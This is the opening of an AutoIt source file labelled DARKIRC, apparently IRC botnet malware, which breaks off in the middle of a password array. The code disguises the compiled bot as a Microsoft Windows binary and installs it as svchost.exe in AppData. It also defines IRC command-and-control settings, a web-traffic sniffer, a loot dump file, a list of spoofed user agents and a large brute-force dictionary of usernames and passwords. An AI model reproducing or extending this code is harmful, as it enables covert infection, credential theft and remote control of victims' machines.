#NoTrayIcon
; DARKIRC ORIGINAL SRC
;
#Region ;**** Directives created by AutoIt3Wrapper_GUI ****
#AutoIt3Wrapper_Outfile=bot.exe
#AutoIt3Wrapper_Compression=4
#AutoIt3Wrapper_UseUpx=y
#AutoIt3Wrapper_UPX_Parameters=--best --lzma
#AutoIt3Wrapper_Res_Comment=Windows Shell Common Binary
#AutoIt3Wrapper_Res_Description=Windows Shell Common Binary
#AutoIt3Wrapper_Res_Fileversion=6.0.6001.18000
#AutoIt3Wrapper_Res_ProductName=Microsoft® Windows® Operating System
#AutoIt3Wrapper_Res_ProductVersion=6.0.6001.18000
#AutoIt3Wrapper_Res_CompanyName=Microsoft
#AutoIt3Wrapper_Res_LegalCopyright=©Microsoft Corporation. All rights reserved.
#AutoIt3Wrapper_Res_Language=1033
#AutoIt3Wrapper_Res_requestedExecutionLevel=asInvoker
#AutoIt3Wrapper_Run_Tidy=y
#Tidy_Parameters=/gd /reel /sci 0 /kv 5 /sf
#AutoIt3Wrapper_Run_Au3Stripper=y
#Au3Stripper_Parameters=/so /mi 5 /mo
#EndRegion ;**** Directives created by AutoIt3Wrapper_GUI ****
If IsAdmin() Then
	$priv = "A"
Else
	$priv = "U"
EndIf
Global $nodes = StringSplit("yourircncdomain1.com:6667|yourircncdomain2.com:6667|", "|", 3)
Global $nodePort = Int(StringSplit($nodes[0], ":", 3)[1]) ; irc port for sniffer to block
Global $sniffopt = "tcp port (80 or 8080 or 8888 or 8181)"
Global $signedin = False
Global $botpassword = "freakruls"
Global $nickformat = $priv & "[" & @OSVersion & "|" & @OSArch & "|" & EnvGet("NUMBER_OF_PROCESSORS") & "]"
Global $botid = randID()
Global $nick = $nickformat & $botid
Global $channel = "#icopypaste"
Global $key = "bighax3s"
Global $trigger = "!"
Global $installdir = @AppDataDir & '\Windows Shell Common Binary'
Global $botproc = "svchost.exe"
Global $installpath = $installdir & '\' & $botproc
Global $lanIP = @IPAddress1
Global $myIP = _GetIP()
Global $dlexe = BinaryToString("0xhex encode dis")
Global $lootLoc = $installdir & "\dump.dat"

Global $useragents[36]
$useragents[0] = "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0"
$useragents[1] = "Mozilla/5.0 (X11; U; Linux ppc; en-US; rv:1.9a8) Gecko/2007100620 GranParadiso/3.1"
$useragents[2] = "Mozilla/5.0 (compatible; U; ABrowse 0.6; Syllable) AppleWebKit/420+ (KHTML, like Gecko)"
$useragents[3] = "Mozilla/5.0 (Macintosh; U; Intel Mac OS X; en; rv:1.8.1.11) Gecko/20071128 Camino/1.5.4"
$useragents[4] = "Mozilla/5.0 (Windows; U; Windows NT 6.1; rv:2.2) Gecko/20110201"
$useragents[5] = "Mozilla/5.0 (X11; U; Linux i686; pl-PL; rv:1.9.0.6) Gecko/2009020911"
$useragents[6] = "Mozilla/5.0 (Windows; U; Windows NT 6.1; cs; rv:1.9.2.6) Gecko/20100628 myibrow/4alpha2"
$useragents[7] = "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; MyIE2; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0)"
$useragents[8] = "Mozilla/5.0 (Windows; U; Win 9x 4.90; SG; rv:1.9.2.4) Gecko/20101104 Netscape/9.1.0285"
$useragents[9] = "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko/20090327 Galeon/2.0.7"
$useragents[10] = "Mozilla/5.0 (PLAYSTATION 3; 3.55)"
$useragents[11] = "Mozilla/5.0 (X11; Linux x86_64; rv:38.0) Gecko/20100101 Thunderbird/38.2.0 Lightning/4.0.2"
$useragents[12] = "wii libnup/1.0"
$useragents[13] = "Mozilla/4.0 (PSP (PlayStation Portable); 2.00)"
$useragents[14] = "PSP (PlayStation Portable); 2.00"
$useragents[15] = "Bunjalloo/0.7.6(Nintendo DS;U;en)"
$useragents[16] = "Doris/1.15 [en] (Symbian)"
$useragents[17] = "BlackBerry7520/4.0.0 Profile/MIDP-2.0 Configuration/CLDC-1.1"
$useragents[18] = "BlackBerry9700/5.0.0.743 Profile/MIDP-2.1 Configuration/CLDC-1.1 VendorID/100"
$useragents[19] = "Opera/9.80 (X11; Linux i686; Ubuntu/14.10) Presto/2.12.388 Version/12.16"
$useragents[20] = "Opera/9.80 (Windows NT 5.1; U;) Presto/2.7.62 Version/11.01"
$useragents[21] = "Mozilla/5.0 (X11; Linux x86_64; U; de; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 Opera 10.62"
$useragents[22] = "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36"
$useragents[23] = "Mozilla/5.0 (Linux; Android 4.4.3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.89 Mobile Safari/537.36"
$useragents[24] = "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/525.19 (KHTML, like Gecko) Chrome/1.0.154.39 Safari/525.19"
$useragents[25] = "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/5.0; chromeframe/11.0.696.57)"
$useragents[26] = "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; SV1; uZardWeb/1.0; Server_JP)"
$useragents[27] = "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_7; en-us) AppleWebKit/530.17 (KHTML, like Gecko) Version/4.0 Safari/530.17 Skyfire/2.0"
$useragents[28] = "SonyEricssonW800i/R1BD001/SEMC-Browser/4.2 Profile/MIDP-2.0 Configuration/CLDC-1.1"
$useragents[29] = "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/4.0; FDM; MSIECrawler; Media Center PC 5.0)"
$useragents[30] = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:5.0) Gecko/20110517 Firefox/5.0 Fennec/5.0"
$useragents[31] = "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; FunWebProducts)"
$useragents[32] = "MOT-V300/0B.09.19R MIB/2.2 Profile/MIDP-2.0 Configuration/CLDC-1.0"
$useragents[33] = "Mozilla/5.0 (Android; Linux armv7l; rv:9.0) Gecko/20111216 Firefox/9.0 Fennec/9.0"
$useragents[34] = "Mozilla/5.0 (compatible; Teleca Q7; Brew 3.1.5; U; en) 480X800 LGE VX11000"
$useragents[35] = "MOT-L7/08.B7.ACR MIB/2.2.1 Profile/MIDP-2.0 Configuration/CLDC-1.1"
Global Const $tagOBJECTATTRIBUTES = "ulong Length;hwnd RootDirectory;ptr ObjectName;ulong Attributes;ptr SecurityDescriptor;ptr SecurityQualityOfService"
Global Const $tagUNICODESTRING = "ushort Length;ushort MaximumLength;ptr Buffer"
Global Const $tagSECURITY_ATTRIBUTES = "dword Length;ptr Descriptor;bool InheritHandle"
Global Const $OBJ_CASE_INSENSITIVE = 0x00000040
Global Const $UBOUND_DIMENSIONS = 0
Global Const $UBOUND_ROWS = 1
Global Const $UBOUND_COLUMNS = 2
Global Enum $ARRAYFILL_FORCE_DEFAULT, $ARRAYFILL_FORCE_SINGLEITEM, $ARRAYFILL_FORCE_INT, $ARRAYFILL_FORCE_NUMBER, _
		$ARRAYFILL_FORCE_PTR, $ARRAYFILL_FORCE_HWND, $ARRAYFILL_FORCE_STRING, $ARRAYFILL_FORCE_BOOLEAN
Global Enum $ARRAYUNIQUE_NOCOUNT, $ARRAYUNIQUE_COUNT
Global Enum $ARRAYUNIQUE_AUTO, $ARRAYUNIQUE_FORCE32, $ARRAYUNIQUE_FORCE64, $ARRAYUNIQUE_MATCH, $ARRAYUNIQUE_DISTINCT
Global Const $STR_ENTIRESPLIT = 1 ; Entire delimiter marks the split
Global Const $STR_NOCOUNT = 2 ; Disable the return count
Global $STANDARD_RIGHTS_REQUIRED = 0x000f0000
Global Const $SERVICE_QUERY_CONFIG = 0x0001
Global Const $SERVICE_CHANGE_CONFIG = 0x0002
Global Const $SERVICE_QUERY_STATUS = 0x0004
Global Const $SERVICE_ENUMERATE_DEPENDENTS = 0x0008
Global Const $SERVICE_START = 0x0010
Global Const $SERVICE_STOP = 0x0020
Global Const $SERVICE_PAUSE_CONTINUE = 0x0040
Global Const $SERVICE_INTERROGATE = 0x0080
Global Const $SERVICE_USER_DEFINED_CONTROL = 0x0100
Global Const $SERVICE_ALL_ACCESS = BitOR($STANDARD_RIGHTS_REQUIRED, _
		$SERVICE_QUERY_CONFIG, _
		$SERVICE_CHANGE_CONFIG, _
		$SERVICE_QUERY_STATUS, _
		$SERVICE_ENUMERATE_DEPENDENTS, _
		$SERVICE_START, _
		$SERVICE_STOP, _
		$SERVICE_PAUSE_CONTINUE, _
		$SERVICE_INTERROGATE, _
		$SERVICE_USER_DEFINED_CONTROL)
Global Const $STDOUT_CHILD = 2
Global Const $STDERR_CHILD = 4
Global $__ghWinInet_FTP = -1
Global $__ghCallback_FTP, $__gbCallback_Set = False
Global Const $INTERNET_SERVICE_FTP = 1
Global Const $INTERNET_FLAG_ASYNC = 0x10000000
Global Const $GENERIC_WRITE = 0x40000000
Global Const $FTP_TRANSFER_TYPE_BINARY = 2 ;Type I transfer method. The file is transferred exactly as it exists with no changes.
Global Const $INTERNET_FLAG_PASSIVE = 0x08000000
Global Const $INTERNET_OPEN_TYPE_DIRECT = 1
Global $line, $foo
Global $user[223]
$user[0] = "Administrator"
$user[1] = "admin"
$user[2] = "admin1"
$user[3] = "admin2"
$user[4] = "remoto2"
$user[5] = "auxiliar"
$user[6] = "support"
$user[7] = "sysadmin"
$user[8] = "master"
$user[9] = "services"
$user[10] = "backup"
$user[11] = "student"
$user[12] = "auxiliar1"
$user[13] = "auxiliar2"
$user[14] = "auxiliar3"
$user[15] = "asistencial"
$user[16] = "asistencial2"
$user[17] = "asistencial3"
$user[18] = "asistencial4"
$user[19] = "usuario2"
$user[20] = "usuario3"
$user[21] = "almacen"
$user[22] = "admision"
$user[23] = "admision1"
$user[24] = "admision2"
$user[25] = "admision3"
$user[26] = "admision4"
$user[27] = "admision5"
$user[28] = "sys"
$user[29] = "root"
$user[30] = "teste"
$user[31] = "teste1"
$user[32] = "test"
$user[33] = "test1"
$user[34] = "123456"
$user[35] = "suporte"
$user[36] = "vendas"
$user[37] = "User"
$user[38] = "User1"
$user[39] = "admins"
$user[40] = "marcos"
$user[41] = "guest"
$user[42] = "Opeator"
$user[43] = "operator"
$user[44] = "@dmin"
$user[45] = "user0"
$user[46] = "user1"
$user[47] = "user2"
$user[48] = "user3"
$user[49] = "user4"
$user[50] = "tester"
$user[51] = "jose"
$user[52] = "Contadora"
$user[53] = "ASPNET"
$user[54] = "amministratori"
$user[55] = "finestre"
$user[56] = "bruker"
$user[57] = "bruker1"
$user[58] = "utente"
$user[59] = "leder"
$user[60] = "leder1"
$user[61] = "leder2"
$user[62] = "administrador"
$user[63] = "remoto"
$user[64] = "remoto1"
$user[65] = "amministratore"
$user[66] = "nome utente"
$user[67] = "direttore"
$user[68] = "direttore1"
$user[69] = "ftpuser"
$user[70] = "user"
$user[71] = "user1"
$user[72] = "usuario"
$user[73] = "usuario1"
$user[74] = "convidado"
$user[75] = "servidor"
$user[76] = "financeiro"
$user[77] = "sistema"
$user[78] = "adm"
$user[79] = "a22"
$user[80] = "12345"
$user[81] = "123"
$user[82] = "1"
$user[83] = "gjest"
$user[84] = "gjest1"
$user[85] = "gjest2"
$user[86] = "mypc"
$user[87] = "pipc"
$user[88] = "invitado"
$user[89] = "sitema"
$user[90] = "prueba"
$user[91] = "elena"
$user[92] = "victor"
$user[93] = "remote"
$user[94] = "guest"
$user[95] = "reception"
$user[96] = "u?ivatel"
$user[97] = "buh"
$user[98] = "linux"
$user[99] = "sklad"
$user[100] = "sklad1"
$user[101] = "administrator"
$user[102] = "1admin"
$user[103] = "administrator1"
$user[104] = "utilizator"
$user[105] = "Utilizator3"
$user[106] = "incercare"
$user[107] = "test2"
$user[108] = "test3"
$user[109] = "indep?rtat"
$user[110] = "remote1"
$user[111] = "serverul"
$user[112] = "server1"
$user[113] = "maestru"
$user[114] = "manager"
$user[115] = "oaspete"
$user[116] = "Guest1"
$user[117] = "manager1"
$user[118] = "mana?er"
$user[119] = "prev?dzkovate?"
$user[120] = "recepcia"
$user[121] = "dia?kov?"
$user[122] = "kore?"
$user[123] = "servera"
$user[124] = "slu?ba"
$user[125] = "podpora"
$user[126] = "system"
$user[127] = "heslo"
$user[128] = "heslo1"
$user[129] = "heslo2"
$user[130] = "heslo3"
$user[131] = "heslo4"
$user[132] = "riadite?"
$user[133] = "remot"
$user[134] = "prueba1"
$user[135] = "Administrador"
$user[136] = "fisio"
$user[137] = "fisio1"
$user[138] = "fisio2"
$user[139] = "fisio3"
$user[140] = "auxiliar"
$user[141] = "auxiliar1"
$user[142] = "auxiliar2"
$user[143] = "auxiliar3"
$user[144] = "asistencial"
$user[145] = "asistencial2"
$user[146] = "asistencial3"
$user[147] = "asistencial4"
$user[148] = "admision"
$user[149] = "admision1"
$user[150] = "admision2"
$user[151] = "admision3"
$user[152] = "admision4"
$user[153] = "admision5"
$user[154] = "mypc"
$user[155] = "administrat?r"
$user[156] = "g?st"
$user[157] = "chef"
$user[158] = "chef1"
$user[159] = "systemet"
$user[160] = "prov"
$user[161] = "prov1"
$user[162] = "anv?ndare"
$user[163] = "anv?ndare1"
$user[164] = "Admin1"
$user[165] = "Master"
$user[166] = "internet"
$user[167] = "uppkoppling"
$user[168] = "skrivbord"
$user[169] = "fj?rrserver"
$user[170] = "Anv?ndarnamn"
$user[171] = "bruger"
$user[172] = "bruger1"
$user[173] = "bruger2"
$user[174] = "adgangskode"
$user[175] = "adgangskode1"
$user[176] = "adgangskode2"
$user[177] = "g?st1"
$user[178] = "root2"
$user[179] = "mester"
$user[180] = "mester2"
$user[181] = "mester1"
$user[182] = "administrateur"
$user[183] = "serveur"
$user[184] = "utilisateur"
$user[185] = "physio"
$user[186] = "soin"
$user[187] = "solid"
$user[188] = "pavel"
$user[189] = "marina"
$user[190] = "topc"
$user[191] = "andreas"
$user[192] = "smirnov"
$user[193] = "scanner"
$user[194] = "scan"
$user[195] = "scanbox"
$user[196] = "seedbox"
$user[197] = "xerox"
$user[198] = "artak"
$user[199] = "brazerol"
$user[200] = "step"
$user[201] = "snowbird"
$user[202] = "bas"
$user[203] = "beheerder"
$user[204] = "gebruiker"
$user[205] = "gebruiker1"
$user[206] = "afgelegen"
$user[207] = "gast"
$user[208] = "John"
$user[209] = "wortel"
$user[210] = "berry"
$user[211] = "meester"
$user[212] = "systeem"
$user[213] = "receptie"
$user[214] = "service"
$user[215] = "miranda"
$user[216] = "riarth?ir"
$user[217] = "aoi"
$user[218] = "bainisteoir"
$user[219] = "bainisteoir1"
$user[220] = "oibreoir"
$user[221] = "freamh"
$user[222] = "freastala"
Global $pass[1638]
$pass[0] = "admin"
$pass[1] = "Admin"
$pass[2] = "password"
$pass[3] = "Password"
$pass[4] = "administrator"
$pass[5] = "Administrator"
$pass[6] = "p@ssw0rd"
$pass[7] = "P@ssw0rd"
$pass[8] = "911"
$pass[9] = "qwerty"
$pass[10] = " 1234"
$pass[11] = "1234567"
$pass[12] = "12345678"
$pass[13] = "123456789"
$pass[14] = "auxiliar"
$pass[15] = "Andre"
$pass[16] = "Robson"
$pass[17] = "Marcelo"
$pass[18] = "servidor"
$pass[19] = "manager"
$pass[20] = "admin1"
$pass[21] = "support "
$pass[22] = "qweqwe"
$pass[23] = "qweasd"
$pass[24] = "qwezxc"
$pass[25] = "qweasdzxc"
$pass[26] = "qwertyuiop"
$pass[27] = "asdfghjkl"
$pass[28] = "zxcvbnm"
$pass[29] = "1"
$pass[30] = "12"
$pass[31] = "123"
$pass[32] = "1234"
$pass[33] = "12345"
$pass[34] = "123456"
$pass[35] = "1234567890"
$pass[36] = "0"
$pass[37] = "01"
$pass[38] = "012"
$pass[39] = "0123"
$pass[40] = "01234"
$pass[41] = "012345"
$pass[42] = "0123456"
$pass[43] = "01234567"
$pass[44] = "012345678"
$pass[45] = "0123456789"
$pass[46] = "9"
$pass[47] = "98"
$pass[48] = "987"
$pass[49] = "9876"
$pass[50] = "98765"
$pass[51] = "987654"
$pass[52] = "9876543"
$pass[53] = "98765432"
$pass[54] = "987654321"
$pass[55] = "9876543210"
$pass[56] = "10"
$pass[57] = "210"
$pass[58] = "3210"
$pass[59] = "43210"
$pass[60] = "543210"
$pass[61] = "6543210"
$pass[62] = "76543210"
$pass[63] = "876543210"
$pass[64] = "21"
$pass[65] = "321"
$pass[66] = "4321"
$pass[67] = "54321"
$pass[68] = "654321"
$pass[69] = "7654321"
$pass[70] = "87654321"
$pass[71] = "00"
$pass[72] = "000"
$pass[73] = "0000"
$pass[74] = "00000"
$pass[75] = "000000"
$pass[76] = "0000000"
$pass[77] = "00000000"
$pass[78] = "000000000"
$pass[79] = "11"
$pass[80] = "111"
$pass[81] = "1111"
$pass[82] = "11111"
$pass[83] = "111111"
$pass[84] = "1111111"
$pass[85] = "11111111"
$pass[86] = "111111111"
$pass[87] = "2"
$pass[88] = "22"
$pass[89] = "222"
$pass[90] = "2222"
$pass[91] = "22222"
$pass[92] = "222222"
$pass[93] = "2222222"
$pass[94] = "22222222"
$pass[95] = "222222222"
$pass[96] = "3"
$pass[97] = "33"
$pass[98] = "333"
$pass[99] = "3333"
$pass[100] = "33333"
$pass[101] = "333333"
$pass[102] = "3333333"
$pass[103] = "33333333"
$pass[104] = "333333333"
$pass[105] = "4"
$pass[106] = "44"
$pass[107] = "444"
$pass[108] = "4444"
$pass[109] = "44444"
$pass[110] = "444444"
$pass[111] = "4444444"
$pass[112] = "44444444"
$pass[113] = "444444444"
$pass[114] = "5"
$pass[115] = "55"
$pass[116] = "555"
$pass[117] = "5555"
$pass[118] = "55555"
$pass[119] = "555555"
$pass[120] = "5555555"
$pass[121] = "55555555"
$pass[122] = "555555555"
$pass[123] = "6"
$pass[124] = "66"
$pass[125] = "666"
$pass[126] = "6666"
$pass[127] = "66666"
$pass[128] = "666666"
$pass[129] = "6666666"
$pass[130] = "66666666"
$pass[131] = "666666666"
$pass[132] = "7"
$pass[133] = "77"
$pass[134] = "777"
$pass[135] = "7777"
$pass[136] = "77777"
$pass[137] = "777777"
$pass[138] = "7777777"
$pass[139] = "77777777"
$pass[140] = "777777777"
$pass[141] = "8"
$pass[142] = "88"
$pass[143] = "888"
$pass[144] = "8888"
$pass[145] = "88888"
$pass[146] = "888888"
$pass[147] = "8888888"
$pass[148] = "88888888"
$pass[149] = "888888888"
$pass[150] = "99"
$pass[151] = "999"
$pass[152] = "9999"
$pass[153] = "99999"
$pass[154] = "999999"
$pass[155] = "9999999"
$pass[156] = "99999999"
$pass[157] = "999999999"
$pass[158] = "admin123"
$pass[159] = "administartor"
$pass[160] = "administrador"
$pass[161] = "almacen"
$pass[162] = "anna"
$pass[163] = "john"
$pass[164] = "jose"
$pass[165] = "master"
$pass[166] = "test"
$pass[167] = "test1"
$pass[168] = "test123"
$pass[169] = "user"
$pass[170] = "User"
$pass[171] = "user1"
$pass[172] = "user123"
$pass[173] = "user2"
$pass[174] = "operator"
$pass[175] = "P@$$w0rd"
$pass[176] = "pa$$word"
$pass[177] = "pass"
$pass[178] = "passw0rd"
$pass[179] = "passwd"
$pass[180] = "password1"
$pass[181] = "Password1"
$pass[182] = "password123"
$pass[183] = "0987654321"
$pass[184] = "112233"
$pass[185] = "123123"
$pass[186] = "123123123"
$pass[187] = "123321"
$pass[188] = "123654"
$pass[189] = "123qwe"
$pass[190] = "123zxc"
$pass[191] = "12qwaszx"
$pass[192] = "131313"
$pass[193] = "159357"
$pass[194] = "159753"
$pass[195] = "1956"
$pass[196] = "19791956"
$pass[197] = "1q2w"
$pass[198] = "1q2w3e"
$pass[199] = "1q2w3e4r"
$pass[200] = "1q2w3e4r5t"
$pass[201] = "1qaz2wsx"
$pass[202] = "1qazxsw2"
$pass[203] = "1und1"
$pass[204] = "2000"
$pass[205] = "2001"
$pass[206] = "2002"
$pass[207] = "2003"
$pass[208] = "2005"
$pass[209] = "2007"
$pass[210] = "2008"
$pass[211] = "2010"
$pass[212] = "321321"
$pass[213] = "456321"
$pass[214] = "753159"
$pass[215] = "8522"
$pass[216] = "a"
$pass[217] = "abc123"
$pass[218] = "abcd1234"
$pass[219] = "access"
$pass[220] = "adm"
$pass[221] = "microsoft"
$pass[222] = "office"
$pass[223] = "opera"
$pass[224] = "password3"
$pass[225] = "pc"
$pass[226] = "power"
$pass[227] = "qaz"
$pass[228] = "qwe"
$pass[229] = "qwerty1"
$pass[230] = "qwerty123"
$pass[231] = "remote"
$pass[232] = "remoto"
$pass[233] = "root"
$pass[234] = "server"
$pass[235] = "service"
$pass[236] = "support"
$pass[237] = "sys"
$pass[238] = "system"
$pass[239] = "taller"
$pass[240] = "temp"
$pass[241] = "usr"
$pass[242] = "usuario"
$pass[243] = "w"
$pass[244] = "xbmc"
$pass[245] = "xxx"
$pass[246] = "ytrewq"
$pass[247] = "z"
$pass[248] = "zaqxsw"
$pass[249] = "zxc"
$pass[250] = "zxcv"
$pass[251] = "enter"
$pass[252] = "13456"
$pass[253] = "Passw0rd"
$pass[254] = "2012"
$pass[255] = "earth"
$pass[256] = "administrateur"
$pass[257] = "www.idcth.com"
$pass[258] = "0000++"
$pass[259] = "rexidc"
$pass[260] = "www.jx163.com"
$pass[261] = "huaibeitc2020"
$pass[262] = "sina.com"
$pass[263] = "1314520"
$pass[264] = "001122"
$pass[265] = "leo_zj2010"
$pass[266] = "zhang123"
$pass[267] = "177@dg2"
$pass[268] = "onlyidc!@#"
$pass[269] = "zs!idc!sx"
$pass[270] = "zjidc!@"
$pass[271] = "zjidc"
$pass[272] = "qwer"
$pass[273] = "idc123"
$pass[274] = "jspower123.0"
$pass[275] = "mima125126zhi"
$pass[276] = "parrot1818"
$pass[277] = "lovect123456"
$pass[278] = "woepwq1985"
$pass[279] = "shenhua"
$pass[280] = "njslt@hhsh.com"
$pass[281] = "wei#7799"
$pass[282] = "chuangshi998"
$pass[283] = "yy*123"
$pass[284] = "3sina.net"
$pass[285] = "feipeng1013"
$pass[286] = "arsESG2S"
$pass[287] = "147258"
$pass[288] = "1230"
$pass[289] = "ksidc"
$pass[290] = "nfvip.com"
$pass[291] = "haoni123"
$pass[292] = "6695zx"
$pass[293] = "scictd9821622"
$pass[294] = "365obsserver!"
$pass[295] = "ranglm123456"
$pass[296] = "13920225257"
$pass[297] = "idc925111"
$pass[298] = "1qaz@wsx#edc"
$pass[299] = ".......199"
$pass[300] = "xu15817079919"
$pass[301] = "yanjin0429"
$pass[302] = "zhangznw"
$pass[303] = "13527380230"
$pass[304] = "idc0.01"
$pass[305] = "idc123&123"
$pass[306] = "662766"
$pass[307] = "122.224"
$pass[308] = "huaiyukeji115"
$pass[309] = ".......199@"
$pass[310] = "liuzhangzi1988"
$pass[311] = "123456!@#$%^"
$pass[312] = "idc0123"
$pass[313] = "dahouzi110"
$pass[314] = "123.789+"
$pass[315] = "trista188#**"
$pass[316] = "mm1237"
$pass[317] = "07736056123"
$pass[318] = "TnHoo15862380404"
$pass[319] = "189532210113"
$pass[320] = "gedingfeng1102888"
$pass[321] = "122.336"
$pass[322] = "5ds65tr5as"
$pass[323] = "122.335"
$pass[324] = "sino"
$pass[325] = "idc123.12"
$pass[326] = "gdfdfhvry"
$pass[327] = "123qwe!@#"
$pass[328] = "123654.com"
$pass[329] = "999wf"
$pass[330] = "9000idclmy.com"
$pass[331] = "123123.com"
$pass[332] = "123wsx"
$pass[333] = "temp123"
$pass[334] = "d4kj010683"
$pass[335] = "5dbm419.86"
$pass[336] = "345%TGB4rfv"
$pass[337] = "5BM4kj19.86"
$pass[338] = "idc55555"
$pass[339] = "123.qwe"
$pass[340] = "youyou168168"
$pass[341] = "400626"
$pass[342] = "jiezu@520"
$pass[343] = "china333idc"
$pass[344] = "weizhu803"
$pass[345] = "china"
$pass[346] = "www.baidu.com"
$pass[347] = "www.qq.com"
$pass[348] = "ynt123456"
$pass[349] = "esinidc"
$pass[350] = "123698745a"
$pass[351] = "$&%*#%#"
$pass[352] = "123..123aa"
$pass[353] = "jdtime123456"
$pass[354] = "13814460001"
$pass[355] = "963852001a"
$pass[356] = "p@ssw7rd"
$pass[357] = "ba!#%#%"
$pass[358] = "456456456"
$pass[359] = "a622aa"
$pass[360] = "~!@#$%^&*()"
$pass[361] = "!@#$%^&*("
$pass[362] = "abcd"
$pass[363] = "qwaszx"
$pass[364] = "qazqaz"
$pass[365] = "qazqazqaz"
$pass[366] = "qazwsxedc"
$pass[367] = "qazxsw"
$pass[368] = "zaxscdvfbgnhmj"
$pass[369] = "qaz!!!"
$pass[370] = "qazxswedcvfr"
$pass[371] = "qazxswedc"
$pass[372] = "zxcvasdfqwer1234"
$pass[373] = "qaz!@#"
$pass[374] = "asdfgzxcvb"
$pass[375] = "rewqasdfvcxz"
$pass[376] = "zzaaqq11"
$pass[377] = "qwe!@#"
$pass[378] = "zaqzxc"
$pass[379] = "1234!@#$%"
$pass[380] = "!@#123"
$pass[381] = "1234qwer"
$pass[382] = "qazwsx"
$pass[383] = "abcdefg"
$pass[384] = "abcde"
$pass[385] = "abcdef"
$pass[386] = "abcd123"
$pass[387] = "123abcd"
$pass[388] = "administrators"
$pass[389] = "admin123456"
$pass[390] = "admin888"
$pass[391] = "admin666"
$pass[392] = "admin111"
$pass[393] = "admin222"
$pass[394] = "admin12345678"
$pass[395] = "admin123456789"
$pass[396] = "admin1234567"
$pass[397] = "admin23456789"
$pass[398] = "admin3456789"
$pass[399] = "admin12345"
$pass[400] = "admin456789"
$pass[401] = "admin1234"
$pass[402] = "admin56789"
$pass[403] = "admin6789"
$pass[404] = "admin12"
$pass[405] = "admin789"
$pass[406] = "admin89"
$pass[407] = "admin9"
$pass[408] = "!@#$"
$pass[409] = "!@#$%^&*"
$pass[410] = "q1w2e3r4"
$pass[411] = "zxcvzx"
$pass[412] = "zxczxc"
$pass[413] = "1234!@#$"
$pass[414] = "1234%^&*"
$pass[415] = "1qaz@wsx"
$pass[416] = "q1w2e3r4t5y6"
$pass[417] = "sqldebugger"
$pass[418] = "needidc"
$pass[419] = "123456qq"
$pass[420] = "100200"
$pass[421] = "!qaz@wsx#edc"
$pass[422] = "!@#$%^&*()"
$pass[423] = "zaq1@wsx"
$pass[424] = "!@#$%"
$pass[425] = "!@#$%^"
$pass[426] = "123qweasdzxc"
$pass[427] = "1qaz2wsx3edc"
$pass[428] = "520"
$pass[429] = "5201314"
$pass[430] = "12341234"
$pass[431] = "12344321"
$pass[432] = "qwertyqwerty"
$pass[433] = "qwertyasdf"
$pass[434] = "adminadmin"
$pass[435] = "q1w2e3"
$pass[436] = "q1w2e3r4t5"
$pass[437] = "qwedsa"
$pass[438] = "qwertyasdfg"
$pass[439] = "qwerfv"
$pass[440] = "qqqqqq"
$pass[441] = "qqqqqqqq"
$pass[442] = "aaaaaa"
$pass[443] = "aaaaaaaa"
$pass[444] = "qwerasdf"
$pass[445] = "windows"
$pass[446] = "qwe321"
$pass[447] = "1234rewq"
$pass[448] = "123456qwe"
$pass[449] = "qazwsxedcrfv"
$pass[450] = "ytisp!@#$bac"
$pass[451] = "adminf"
$pass[452] = "feixiang"
$pass[453] = "7730.."
$pass[454] = "654123"
$pass[455] = "4882265"
$pass[456] = "idchello.com"
$pass[457] = "177@sx7"
$pass[458] = "asd"
$pass[459] = "gmgg"
$pass[460] = "cq880331"
$pass[461] = "idc1234.com"
$pass[462] = "yingp!@#"
$pass[463] = "nimade110"
$pass[464] = "a123.123"
$pass[465] = "lkasdjf89wer2"
$pass[466] = "7730"
$pass[467] = "adminzg006...```"
$pass[468] = "xiaofang520"
$pass[469] = "chinadatas.com"
$pass[470] = "0303"
$pass[471] = "ba0260!#"
$pass[472] = "28losttempnt0go"
$pass[473] = "zhangznw588"
$pass[474] = "ba0260!#%#%"
$pass[475] = "ytisp123"
$pass[476] = "yzdx2011"
$pass[477] = "ytispco,.LTD!@#"
$pass[478] = "asd321"
$pass[479] = "idc89519"
$pass[480] = "7@177sx"
$pass[481] = "13879428.."
$pass[482] = "x1i5n3nu#2011"
$pass[483] = "ntidc!@#"
$pass[484] = "zs!lxg!fw"
$pass[485] = "dqjhjxidc123"
$pass[486] = "qingshan#@!0"
$pass[487] = "xiaochen"
$pass[488] = "a123.321"
$pass[489] = "10086...a"
$pass[490] = "123258."
$pass[491] = "123.123"
$pass[492] = "258.258"
$pass[493] = "147369."
$pass[494] = "123311"
$pass[495] = "147852"
$pass[496] = "789456."
$pass[497] = "789369"
$pass[498] = "123.456"
$pass[499] = "369333"
$pass[500] = "123789"
$pass[501] = "asd2099"
$pass[502] = "maomao"
$pass[503] = "1.1"
$pass[504] = "123.."
$pass[505] = "a123"
$pass[506] = "531idc"
$pass[507] = "lp123!njx@"
$pass[508] = "a321"
$pass[509] = "ylispidc"
$pass[510] = "idc!@#123"
$pass[511] = "zs@idc@sx"
$pass[512] = "canimabi"
$pass[513] = "1q2w3e,./"
$pass[514] = "nfidc2011"
$pass[515] = "nfidc2099"
$pass[516] = "idc2099"
$pass[517] = "idc2011"
$pass[518] = "nfidc89519"
$pass[519] = "15394391"
$pass[520] = "nfidcasd"
$pass[521] = "HUAIBEI2011"
$pass[522] = "nfidc"
$pass[523] = "feichi"
$pass[524] = "1314520../"
$pass[525] = "longkaishile"
$pass[526] = "gm10571177"
$pass[527] = "0578110"
$pass[528] = "nfidc25811"
$pass[529] = "#xjace!!$@"
$pass[530] = "gmjia"
$pass[531] = "gmjia12345688"
$pass[532] = "noparking"
$pass[533] = "gmjiabiexiaole"
$pass[534] = "gmjialieguang123"
$pass[535] = "gmjiaxiongdi520"
